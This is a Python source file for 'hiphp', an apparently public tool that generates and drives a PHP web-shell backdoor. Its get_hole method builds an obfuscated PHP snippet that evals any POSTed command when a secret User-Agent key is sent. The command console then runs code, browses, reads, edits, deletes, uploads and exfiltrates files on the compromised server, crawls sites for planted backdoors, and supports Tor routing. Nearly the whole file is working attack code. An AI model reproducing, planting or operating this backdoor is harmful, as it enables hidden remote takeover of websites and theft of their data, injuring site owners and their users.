#!/usr/bin/env python
# coding:utf-8
#   |                                                          |
# --+----------------------------------------------------------+--
#   |   Code by : yasserbdj96                                  |
#   |   Email   : yasser.bdj96@gmail.com                       |
#   |   Github  : https://github.com/yasserbdj96               |
#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
# --+----------------------------------------------------------+--  
#   |        all posts #yasserbdj96 ,all views my own.         |
# --+----------------------------------------------------------+--
#   |                                                          |

#START{
from hiphp.hiphpversion import __version__
from hiphp.hiphpcoding import rot13,tobase64,tomd5
from hiphp.hiphpphpfunctions import *
from hiphp.hiphphelp import help
from hiphp.hiphpmsgs import *
from hiphp.hiphplicense import license
from hiphp.hiphpabout import about
from hiphp.hiphplogo import *
from hiphp.hiphpeditor import editor
from hiphp.hiphplinkextractor import *
#from ashar import *
from hexor import *
#from asciitext import *
import requests
import re
import ast
from os.path import exists
from biglibrary import *
import base64

#
import os
# if OS is Windows:
if os.name == 'nt':
    os.system('color')
    #    import readline
# if OS is Linux:
else:
    try:
        import readline
    except:
        pass

#start hiphp class:
class hiphp:
    #__init__:
    def __init__(self,key,url,retu=False,proxies=""):
        #
        self.key=tomd5(str(key))# Encrypt the 'key' with 'md5'.
        self.url=str(url)
        self.retu=retu

        #
        url_w=re.compile(r"https?://(www\.)?")
        self.url_w=url_w.sub('',str(url)).strip().strip('/')
        self.headers={'User-Agent':self.key}

        #colors with hexor:
        self.color=hexor(True,"hex")
        self.color2=hexor(False,"hex")

        #used hex colors in this programm:
        self.c_red="#ea4335"#red
        self.c_white_red="#f3938b"#white-red
        self.c_blue="#4285f4"#blue
        self.c_yellow="#fbbc05"#yellow
        self.c_green="#34a853"#green
        self.c_white="#ffffff"
        #
        self.set=""
        self.cd=""
        self.do_x=0

        #
        self.sep=os.sep

        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())

        self.proxies=proxies

    #cli:
    def cli(self):
        #logo
        logox=""
        if self.do_x==0:
            logox=logo(__version__)
            self.do_x+=1

        #getcwd
        getcwd=""
        try:
            reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
        except:
            reee=None
        
        if (emsg_1 in reee) or (reee==None) or (emsg_3 in reee):
            #print(reee)
            #exit()
            scanner=input(f"Scan '{self.url}' to find HIPHP_HOLE_CODE (Y/N):")
            if scanner.lower()=="y":
                def crawl(url):
                    #all_links=[]
                    #print(f"[*] Crawling: {url}")
                    links = get_all_website_links(url)
                    for link in links:
                        check_hiphp_in(link)
                        crawl(link)

                def check_hiphp_in(url):
                    #self.url=str(url)

                    pp11=hiphp.do(self,self.key,url,self.headers,True,f"echo '{self.key}';")

                    #p0=hiphp(key=self.key,url=url,retu=True)
                    #p1=p0.run(f"mkdir('ccccccc');")
                    #print(pp11)
                    if pp11!=self.key:
                        self.color2.c(errx+" "+url,self.c_red)
                        #print(url+" unsucceed!")
                    else:
                        self.color2.c(msgs+" "+url,self.c_green)
                        self.url=url
                        hiphp.cli(self)
                        #print(url+" Succeed!")
                        exit()
                crawl(self.url)
                exit()
                """
                import requests
                from bs4 import BeautifulSoup
 
                urls_list=[]
                urls = self.url
                grab = requests.get(urls)
                soup = BeautifulSoup(grab.text, 'html.parser')
                for link in soup.find_all("a"):
                    data = link.get('href')
                    urls_list.append(data)
                    #print(data)
                for i in range(len(urls_list)):
                    p1=hiphp(key=self.key,url=urls_list[i],retu=True).run(f"echo '{self.key}';")
                    if p1!=self.key:
                        print(urls_list[i]+" unsucceed!")
                    else:
                        print(urls_list[i]+" Succeed!")
                        exit()
                    #print(p1)
                exit()
                """
            else:
                #hiphp.get_hole(self,get=True)
                return reee
        else:
            getcwd=self.color.c(reee,self.c_green)
        #
        xxr1=self.color.c('┌──(',self.c_blue)
        xxr2=self.color.c(')──[',self.c_blue)
        xxr3=self.color.c(']',self.c_blue)
        #xxr4=self.color.c('└─',self.c_blue)+" "
        xxr4=self.color.c('└─HIPHP>',self.c_blue)+" "
        #
        key_w_color=self.color.c(self.key,self.c_red)
        url_w_color=self.color.c(self.url_w,self.c_yellow)
        at=self.color.c("||",self.c_blue)
        print(logox+"\n"+xxr1+key_w_color+at+url_w_color+xxr2+getcwd+xxr3)

        #try:
        command=input(xxr4)
        #except:
        #    exit()
        if command and command!="":
            #help
            if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
                help_c=command.split(" ")
                try:
                    help(__version__,help_c[1])
                except:
                    print(help(__version__))
            #version
            elif command[0:9].lower()=="--version" or command[0:7].lower()=="version":
                print(__version__)
            #exit
            elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
                exit()
            #license
            elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
                print(license())
            #about
            elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                print(about())
            #download
            elif command[0:6].lower()=="--down" or command[0:4].lower()=="down" or command[0:8].lower()=="download":
                down=command.split(" ")
                try:
                    if down[1].lower()=="-f":
                        """command=file_get_contents(down[2])
                        content=hiphp.do(self,self.key,self.url,self.headers,True,command)
                        try:
                            out_path=down[3]
                        except:
                            out_path=""
                        finally:
                            f = open(out_path+down[2], "w+")
                            f.write(content)
                            f.close()"""
                        try:
                            out_path=down[3]
                        except:
                            out_path=""
                        print(smsg_1+hiphp.download(self,down[2],out_path))
                    elif down[1].lower()=="-d":
                        try:
                            zip_file_name=hiphp.compress(self,down[2])
                        except:
                            zip_file_name=hiphp.compress(self)
                        #zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)

                        try:
                            out_path=down[3]
                        except:
                            out_path=""
                        print(smsg_1+hiphp.download(self,zip_file_name,out_path))
                    elif down[1].lower()=="-all":
                        try:
                            out_path=down[2]
                        except:
                            out_path=""
                        zip_file_name=hiphp.compress(self)
                        print(smsg_1+hiphp.download(self,zip_file_name,out_path))

                except:
                    help(__version__,"--down")
            #zip
            elif command[0:5].lower()=="--zip" or command[0:3].lower()=="zip":
                
                try:
                    ziping=command.split(" ")[1]
                    try:
                        zip_file_name=hiphp.compress(self,ziping)
                    except:
                        zip_file_name=hiphp.compress(self)
                    print(smsg_2+reee+self.DS+zip_file_name)
                except:
                    help(__version__,"--zip")
            #update
            elif command[0:8].lower()=="--update" or command[0:6].lower()=="update":
                r="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
                version = requests.get(r).text
                version=version.replace('\n', ' ').replace('\r', '').replace(' ', '')
                if version==__version__:
                    new=False
                else:
                    p1,p2,p3=version.split(".")
                    s1,s2,s3=__version__.split(".")
                    if p1>=s1 and p2>=s2 and p3>s3:
                        new=True
                    elif p1>=s1 and p2>s2 and p3<=s3:
                        new=True
                    else:
                        new=False
                if new==True:
                    print(msg_2+version)
                    print(msg_3)
                else:
                    print(msg_4)
            #ls
            elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
                if len(command)==4 or len(command)==2:
                    command=scandir()
                elif command[0:4].lower()=="--ls" and command[5:9].lower()=="-all":
                    dirx=command[10:]
                    if dirx=="":
                        dirx="."+self.DS
                    command=scandir_all(dirx)
                elif command[0:2].lower()=="ls" and command[3:7].lower()=="-all":
                    dirx=command[8:]
                    if dirx=="":
                        dirx="."+self.DS
                    command=scandir_all(dirx)
                else:
                    if len(command)==4:
                        dirx=command[5:]
                    else:
                        dirx=command[3:]
                    
                    if dirx[-1]!=self.DS:
                        dirx+=self.DS
                    command=scandir(dirx)
                sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
                x=ast.literal_eval(sd)

                for i in range(len(x)):
                    if x[i]!="." and x[i]!="..":
                        x[i]=x[i].replace("\/","/")
                if len(x)>1:
                    separators=" | "
                else:
                    separators=""
                biglibrary().lslist(x,separator=separators)
            #set
            elif command[0:4].lower()=="--cd" or command[0:2].lower()=="cd":
                self.cd=""
                if command[0:4].lower()=="--cd":
                    self.cd=f"chdir('{reee}{self.DS}{command[5:]}');"
                else:
                    self.cd=f"chdir('{reee}{self.DS}{command[3:]}');"
            #set
            elif command[0:5].lower()=="--set" or command[0:3].lower()=="set":
                if command[0:5].lower()=="--set":
                    self.set+=command[6:]
                else:
                    self.set+=command[4:]
            #delete set
            elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
                self.set=""
            #clear
            elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
                os.system('cls' if os.name == 'nt' else 'clear')
            #Get the hole Code
            elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
                hiphp.get_hole(self,get=True)
            #cat
            elif command[0:5].lower()=="--cat" or command[0:3].lower()=="cat":
                if command[0:5].lower()=="--cat":
                    dirx=command[6:]
                else:
                    dirx=command[4:]
                command=file_get_contents(dirx)
                hiphp.do(self,self.key,self.url,self.headers,False,command)
            #cat
            elif command[0:5].lower()=="--edt" or command[0:3].lower()=="edt" or command[0:4].lower()=="edit":
                dirx=command.split(" ")[1]
                #if command[0:5].lower()=="--edt":
                #    dirx=command[6:]
                #else:
                #    dirx=command[4:]
                
                try:
                    from_path=os.path.dirname(dirx)
                except:
                    from_path="."
                #print(from_path)
                out_path=hiphp.download(self,dirx,"")
                editor(out_path)
                hiphp.run(self,f"unlink('{dirx}');")
                if from_path=="":
                    hiphp.upload(self,out_path)
                else:
                    hiphp.upload(self,out_path,from_path+self.DS)
                os.remove(out_path)
                #os.system('cls' if os.name == 'nt' else 'clear')
                #print(out_path)

            #remove:
            elif command[0:4].lower()=="--rm" or command[0:2].lower()=="rm" or command[0:6].lower()=="delete":
                dirx=command.split(" ")
                try:
                    command=rm(dirx[1],dirx[2])
                    hiphp.do(self,self.key,self.url,self.headers,False,command)
                except:
                    help(__version__,"--rm")
            #php_info:
            elif command[0:9].lower()=="--phpinfo" or command[0:7].lower()=="phpinfo":
                command=php_info()
                hiphp.do(self,self.key,self.url,self.headers,False,command)
            #rf
            elif command[0:4].lower()=="--rf" or command[0:2].lower()=="rf" or command[0:3].lower()=="run":
                varss=command.split(" ")
                if varss[len(varss)-1]=="":
                    del varss[len(varss)-1]
                print(hiphp.run_file(self,varss[1],varss[2:]))
            #up
            elif command[0:4].lower()=="--up" or command[0:2].lower()=="up" or command[0:6].lower()=="upload":
                v=command.split(" ")
                #print(v)
                if len(v)>2:
                #try:
                    file_path=v[1]
                    to=v[2]
                    if to[len(to)-1:len(to)]!=self.DS:
                        to=to+self.DS
                    hiphp.upload(self,file_path,to)                    
                #except:
                else:
                    hiphp.upload(self,command.split(" ")[1])
            else:
                comand_return=hiphp.do(self,self.key,self.url,self.headers,True,command)
                if comand_return!="":
                    print(comand_return)
                else:
                    self.color2.c(errx+" "+command+emsg_6,self.c_red)
        else:
            self.color2.c(emsg_2,self.c_red)
        hiphp.cli(self)

    #do:
    def do(self,key,url,header,retu,command):
        regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
        proxies_onion = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
        try:
            if regex.match(url):
                #.onion
                response=requests.post(url,headers=header,proxies=proxies_onion)
            else:
                if self.proxies!="":
                    response=requests.post(url,headers=header,proxies=self.proxies)
                else:
                    response=requests.post(url,headers=header)
            #response=requests.post(url,headers=header)
            #
            if response.status_code==200:
                key_len=len(key)+1
                # if the key are true:
                if response.text[0:key_len]=="#"+key:
                    ploads={'command':self.cd+self.set+command}
                    if ".onion" in url:
                        response=requests.post(url,headers=header,data=ploads,proxies=proxies_onion)
                    else:
                        if self.proxies!="":
                            response=requests.post(url,headers=header,data=ploads,proxies=self.proxies)
                        else:
                            response=requests.post(url,headers=header,data=ploads)
                    response_text=response.text[key_len:]
                    if retu==True:
                        return response_text
                    else:
                        if len(response_text)!=0:
                            print(response_text)
                else:
                    if retu==True:
                        return emsg_1
                    else:
                        hexor().c(emsg_1,self.c_red)
                        exit()
        except:
            emsg=emsg_3+" '"+url+"'."
            if retu==True:
                return emsg
            else:
                hexor().c(emsg,self.c_red)
                exit()

    #run_file:
    def run_file(self,file_path,*opts):        
        if exists(file_path):
            open_file=open(file_path).read()
            #
            if open_file[0:5]=="<?php":
                open_file=open_file[6:]
            if open_file[len(open_file)-2:len(open_file)]=="?>":
                open_file=open_file[:len(open_file)-2]
            #
            if len(opts)>0:
                if type(opts[0])==list:
                    opts=opts[0]
                #
                for i in range(len(opts)):
                    value,string=opts[i].split("==")
                    open_file=open_file.replace(f"__{value}__",string)
            
            result=hiphp.do(self,self.key,self.url,self.headers,True,open_file)
            if self.retu==False:
                print(result)
            return result
        else:
            self.color2.c(emsg_4,self.c_red)

    #run:
    def run(self,command):
        if self.retu==True:
            return hiphp.do(self,self.key,self.url,self.headers,True,command)
        else:
            hiphp.do(self,self.key,self.url,self.headers,False,command)

    #upload:
    def upload(self,path_to_upluad,to=""):
        try:
            with open(path_to_upluad,"rb") as base64_file:
                encoded_string=tobase64(base64_file.read().decode("utf-8"))
            p=""
            if to!="":
                if to[0:2]!="."+self.DS:
                    p="."+self.DS
                hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
            hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
        except:
            self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)

    #compress:
    def compress(self,path=""):
        if path!="":
            command=zip_path(path)
        else:
            command=zip_path()
        zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)
        if self.retu==False:
            print(zip_file_name)
        return zip_file_name

    #download:
    def download(self,path_x,outpath=""):
        new_command=file_to_b64(path_x)
        path_x=os.path.basename(path_x)
        if outpath=="":
            outpath=os.path.abspath(os.getcwd())
        
        if outpath[-1]!=self.sep:
            outpath+=self.sep

        down_path=outpath+""+path_x

        zip_file_b64_content=hiphp.do(self,self.key,self.url,self.headers,True,new_command)
        with open(down_path, 'wb') as f:  
            f.write(base64.b64decode(zip_file_b64_content))
        f.close()

        if self.retu==False:
            print(down_path)
        return down_path

    #get the hole:
    def get_hole(self,get=False):
        code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
        code=rot13(tobase64(rot13(tobase64(rot13(code)))))
        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
        php_s="/*HIPHP_HOLE_CODE START*/"
        php_e="/*HIPHP_HOLE_CODE END*/"

        if self.retu==True and get==False:
            return php_s+"\n"+code+"\n"+php_e
        else:
            geth=self.color.c(msg_1+"\n",self.c_yellow)
            geth+=self.color.c(php_s+"\n",self.c_red)
            geth+=self.color.c(code+"\n",self.c_green)
            geth+=self.color.c(php_e,self.c_red)
            print(geth)
#}END.